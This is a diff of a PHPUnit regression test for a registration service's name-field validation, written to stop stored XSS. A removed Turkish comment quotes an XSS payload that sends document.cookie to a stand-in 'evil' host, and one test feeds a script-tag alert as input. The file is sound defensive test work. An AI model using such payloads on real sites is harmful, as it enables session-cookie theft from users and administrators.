@@ -7,49 +7,36 @@ namespace App\Tests\Unit\Core\Account;
 use App\Core\Account\AccountRegistrationService;
 use App\Core\Localization\LocaleProvider;
 use App\Core\Mail\CpMailerService;
+use App\Core\Mail\Repository\MailLogRepository;
+use App\Core\Security\Password\BreachChecker;
+use App\Core\Security\Password\PasswordHistory;
+use App\Core\Security\Password\PasswordPolicy;
 use App\Core\Settings\SettingDefinition;
 use App\Core\Settings\SettingsRegistry;
+use App\Core\Token\TokenReplacer;
+use App\Core\Token\TokenTypeRegistry;
 use App\Repository\LocaleRepository;
 use App\Repository\SettingRepository;
 use App\Repository\UserRepository;
+use Doctrine\DBAL\DriverManager;
 use Doctrine\ORM\EntityManagerInterface;
 use PHPUnit\Framework\Attributes\CoversClass;
 use PHPUnit\Framework\Attributes\DataProvider;
 use PHPUnit\Framework\MockObject\MockObject;
 use PHPUnit\Framework\TestCase;
 use Symfony\Component\Cache\Adapter\ArrayAdapter;
+use Symfony\Component\HttpClient\MockHttpClient;
+use Symfony\Component\HttpClient\Response\MockResponse;
 use Symfony\Component\HttpFoundation\RequestStack;
+use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;
+use Symfony\Component\Messenger\MessageBusInterface;
 use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
+use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
 use Symfony\Contracts\Translation\TranslatorInterface;
 
 /**
- * SEC-03 REGRESYON TESTİ — kayıt formundaki ad alanı doğrulaması.
- *
- * ══ Bu testin var olma sebebi ═══════════════════════════════════════════
- *
- * validateNameField() denetim öncesi YALNIZCA "boş mu" kontrolü
- * yapıyordu: uzunluk sınırı, karakter kısıtı ve HTML denetimi yoktu.
- *
- * Bu değer User::getFullName() üzerinden ForumTopic::$firstPosterName
- * alanına denormalize ediliyor ve forum konu listesinde
- * forum/topics.html.twig içinde "|raw" ile basılıyordu. Kayıt açıkken
- * KİMLİĞİ DOĞRULANMAMIŞ bir ziyaretçi, adına
- *
- *     <img src=x onerror="fetch('//evil/?c='+document.cookie)">
- *
- * yazarak listeyi gören herkeste — moderatörler ve yöneticiler dahil —
- * script çalıştırabiliyordu.
- *
- * ══ Bu testin kapsamı ve sınırı ═════════════════════════════════════════
- *
- * Burada test edilen BİRİNCİ katmandır: zararlı karakterlerin
- * veritabanına hiç girmemesi. İKİNCİ katman şablon tarafındaki "|e"
- * kaçışıdır ve asıl yükü o taşır — çünkü firstPosterName bir anlık
- * görüntüdür ve bu düzeltmeden ÖNCE kaydolmuş adlar veritabanında olduğu
- * gibi durur. Girdi doğrulaması onları geriye dönük temizlemez.
- *
- * validateNameField() private'tır; test onu genel validate() üzerinden
- * çağırır — yani gerçek kullanım yolunu, reflection'a başvurmadan.
+ * SEC-03 regression test — registration name-field validation.
+ * Covers input-layer rejection of XSS payloads; template escaping is a separate layer.
  */
 #[CoversClass(AccountRegistrationService::class)]
 final class AccountRegistrationServiceTest extends TestCase
@@ -62,29 +49,19 @@ final class AccountRegistrationServiceTest extends TestCase
     {
         $this->userRepository = $this->createMock(UserRepository::class);
 
-        // E-posta ve kullanıcı adı çakışması YOK: testin odağı ad
-        // alanları, o yüzden diğer hatalar sonuca karışmamalı.
+        // No email/username conflicts — focus is name fields only.
         $this->userRepository->method('isEmailTakenByAnotherUser')->willReturn(false);
         $this->userRepository->method('findOneByUsername')->willReturn(null);
 
-        // Ad/soyad alanları "zorunlu" modda: doğrulama yolunun tamamı
-        // devrede olsun.
+        // Name fields in required mode so full validation runs.
         $this->service = $this->createService(AccountRegistrationService::FIELD_REQUIRED);
     }
 
-    /**
-     * SettingsRegistry "final"dır ve doubling edilemez — bilinçli bir
-     * tasarım kararıdır. Bu yüzden GERÇEK registry, sahte bir
-     * SettingRepository ve gerçek SettingDefinition'larla kurulur.
-     *
-     * Mock'lamaktan daha iyi bir testtir: ayar çözümlemesinin gerçek
-     * yolu (tanım -> DB override -> tip dönüşümü) test kapsamına girer,
-     * "bir mock ne döndürürse o" tautolojisi yerine.
-     */
+    /** Real SettingsRegistry with mocked repository — final class cannot be doubled. */
     private function createService(string $nameFieldMode): AccountRegistrationService
     {
         $settingRepository = $this->createMock(SettingRepository::class);
-        // DB'de override YOK -> her ayar kendi tanımındaki default'a düşer.
+        // No DB overrides — each setting falls back to its definition default.
         $settingRepository->method('findAllAsMap')->willReturn([]);
 
         $localeRepository = $this->createMock(LocaleRepository::class);
@@ -114,11 +91,48 @@ final class AccountRegistrationServiceTest extends TestCase
             ));
         }
 
-        // Çevirmen, anahtarı olduğu gibi döndürür: böylece testler
-        // çeviri METNİNE değil, üretilen HATA ANAHTARINA bakar ve dil
-        // dosyası değişince kırılmaz.
+        // Translator returns keys as-is — assertions target error keys, not translated text.
         $translator = $this->createMock(TranslatorInterface::class);
         $translator->method('trans')->willReturnArgument(0);
+
+        /*
+         * PasswordPolicy final — mock edilemez (PHPUnit 11 ClassIsFinalException).
+         * Bu test parola kuralını değil ad alanı doğrulamasını ölçüyor, bu yüzden
+         * gerçek ama bilinçli olarak izin verici bir politika kuruluyor: sızıntı
+         * kontrolü kapalı, HTTP istemcisi hiçbir zaman çağrılmayacak bir sahte,
+         * geçmiş tablosu bellek içi SQLite.
+         */
+        foreach ([
+            "security.password_min_length" => 8,
+            "security.password_required_classes" => 1,
+            "security.password_breach_check" => false,
+            "security.password_history_depth" => 0,
+        ] as $key => $default) {
+            $settings->addDefinition(new SettingDefinition(
+                key: $key,
+                label: $key,
+                type: "text",
+                default: $default,
+                variants: [],
+                module: "core",
+                group: "security",
+            ));
+        }
+
+        $passwordPolicy = new PasswordPolicy(
+            $settings,
+            new BreachChecker(
+                new MockHttpClient(static fn (): MockResponse => new MockResponse("", ["http_code" => 503])),
+                new ArrayAdapter(),
+            ),
+            new PasswordHistory(
+                DriverManager::getConnection(["driver" => "pdo_sqlite", "memory" => true]),
+                new PasswordHasherFactory([
+                    PasswordAuthenticatedUserInterface::class => ["algorithm" => "bcrypt", "cost" => 4],
+                ]),
+            ),
+            $translator,
+        );
 
         return new AccountRegistrationService(
             $settings,
@@ -126,24 +140,23 @@ final class AccountRegistrationServiceTest extends TestCase
             $this->createMock(EntityManagerInterface::class),
             $this->createMock(UrlGeneratorInterface::class),
             $translator,
-            // CpMailerService de "final"dır. Gerçek nesne, aynı (gerçek)
-            // SettingsRegistry ile kurulur; "mail.enabled" tanımı
-            // olmadığı için isEnabled() false döner ve doğrulama akışı
-            // hiçbir e-posta göndermeye kalkışmaz — testin istediği tam
-            // olarak budur.
-            new CpMailerService($settings),
+            // Real CpMailerService — no mail.enabled definition, so no mail is sent.
+            new CpMailerService(
+                $settings,
+                $this->createMock(MessageBusInterface::class),
+                $this->createMock(EntityManagerInterface::class),
+                $this->createMock(MailLogRepository::class),
+            ),
+            // Real TokenReplacer, no providers needed — this test never exercises mail sending.
+            new TokenReplacer([], new TokenTypeRegistry()),
+            $passwordPolicy,
         );
     }
 
-    // ═════════════════════════════════════════════════════════════════════
-    // Meşru adlar kabul edilmeli
-    // ═════════════════════════════════════════════════════════════════════
+    // Legitimate names must be accepted
 
     /**
-     * Doğrulamanın en büyük riski aşırı katı olmaktır: gerçek insanları
-     * kendi adlarıyla kaydolmaktan alıkoyan bir "güvenlik" önlemi, bir
-     * hatadır. Bu liste Latin dışı alfabeleri ve noktalama içeren meşru
-     * adları kapsar.
+     * Legitimate names including non-Latin scripts and punctuation.
      *
      * @return iterable<string, array{string}>
      */
@@ -180,12 +193,10 @@ final class AccountRegistrationServiceTest extends TestCase
         );
     }
 
-    // ═════════════════════════════════════════════════════════════════════
-    // XSS payload'ları reddedilmeli
-    // ═════════════════════════════════════════════════════════════════════
+    // XSS payloads must be rejected
 
     /**
-     * Denetim raporundaki saldırı ve yakın varyantları.
+     * Audit-report attack payloads and close variants.
      *
      * @return iterable<string, array{string}>
      */
@@ -213,10 +224,7 @@ final class AccountRegistrationServiceTest extends TestCase
         );
     }
 
-    /**
-     * Aynı kural soyad alanı için de geçerli olmalı: iki alan aynı
-     * denormalizasyon yolundan geçer, birini korumak yetmez.
-     */
+    /** Same rule applies to last name — both fields share the denormalization path. */
     #[DataProvider('xssPayloadProvider')]
     public function testXssPayloadsAreRejectedInLastNameToo(string $payload): void
     {
@@ -226,9 +234,7 @@ final class AccountRegistrationServiceTest extends TestCase
     }
 
     /**
-     * Tek tek yasaklı karakterler — payload'lar yerine yapı taşları.
-     * Bu, gelecekte biri regex'i "biraz gevşetmeye" kalkarsa hangi
-     * karakterin hangi riski taşıdığını açıkça belgeler.
+     * Individual forbidden characters — documents each building block.
      *
      * @return iterable<string, array{string}>
      */
@@ -256,9 +262,7 @@ final class AccountRegistrationServiceTest extends TestCase
         self::assertContains('account.register.first_name_invalid', $errors);
     }
 
-    // ═════════════════════════════════════════════════════════════════════
-    // Uzunluk sınırı
-    // ═════════════════════════════════════════════════════════════════════
+    // Length limit
 
     public function testNameLongerThanSixtyCharactersIsRejected(): void
     {
@@ -267,14 +271,10 @@ final class AccountRegistrationServiceTest extends TestCase
         self::assertContains('account.register.first_name_too_long', $errors);
     }
 
-    /**
-     * Uzunluk KARAKTERLE ölçülmeli, baytla değil: 60 Türkçe karakter
-     * UTF-8'de 60'tan fazla bayt eder ve mb_strlen kullanılmazsa meşru
-     * bir ad yanlışlıkla reddedilirdi.
-     */
+    /** Length must be measured in characters (mb_strlen), not bytes. */
     public function testLengthIsMeasuredInCharactersNotBytes(): void
     {
-        // 40 karakter, ama her biri 2 bayt -> 80 bayt.
+        // 40 characters, each 2 bytes in UTF-8 -> 80 bytes total.
         $name = str_repeat('ş', 40);
 
         self::assertSame(40, mb_strlen($name));
@@ -285,9 +285,7 @@ final class AccountRegistrationServiceTest extends TestCase
         self::assertSame([], $errors, 'Uzunluk baytla olculmus — mb_strlen kullanilmali.');
     }
 
-    // ═════════════════════════════════════════════════════════════════════
-    // Zorunluluk ve opsiyonellik davranışı
-    // ═════════════════════════════════════════════════════════════════════
+    // Required vs optional field behaviour
 
     public function testEmptyRequiredNameProducesRequiredError(): void
     {
@@ -296,30 +294,23 @@ final class AccountRegistrationServiceTest extends TestCase
         self::assertContains('account.register.first_name_required', $errors);
         self::assertContains('account.register.last_name_required', $errors);
 
-        // Boş bir alan için "geçersiz karakter" hatası ÜRETİLMEMELİ:
-        // kullanıcıya iki çelişkili mesaj göstermek kötü bir deneyimdir.
+        // Empty field must not also produce "invalid character" — avoid conflicting messages.
         self::assertNotContains('account.register.first_name_invalid', $errors);
     }
 
-    /**
-     * Alan gizliyse (FIELD_HIDDEN) hiçbir doğrulama yapılmamalı —
-     * kullanıcının dolduramadığı bir alan yüzünden kayıt engellenemez.
-     */
+    /** Hidden fields (FIELD_HIDDEN) must not be validated at all. */
     public function testHiddenFieldIsNotValidatedAtAll(): void
     {
         $service = $this->createService(AccountRegistrationService::FIELD_HIDDEN);
 
-        // Gizli alanda XSS payload'ı bile olsa doğrulama devreye girmez;
-        // çünkü o değer forma hiç basılmamıştır ve kullanıcıdan gelmez.
+        // Hidden field skips validation even for XSS — value is not user-supplied.
         $errors = $service->validate($this->input(firstName: '<script>alert(1)</script>', lastName: ''));
 
         self::assertNotContains('account.register.first_name_invalid', $errors);
         self::assertNotContains('account.register.first_name_required', $errors);
     }
 
-    // ═════════════════════════════════════════════════════════════════════
-    // Yardımcı
-    // ═════════════════════════════════════════════════════════════════════
+    // Helpers
 
     /**
      * @return array{email: string, username: string, firstName: string, lastName: string, password: string, passwordConfirm: string, termsAccepted: bool, locale: string}
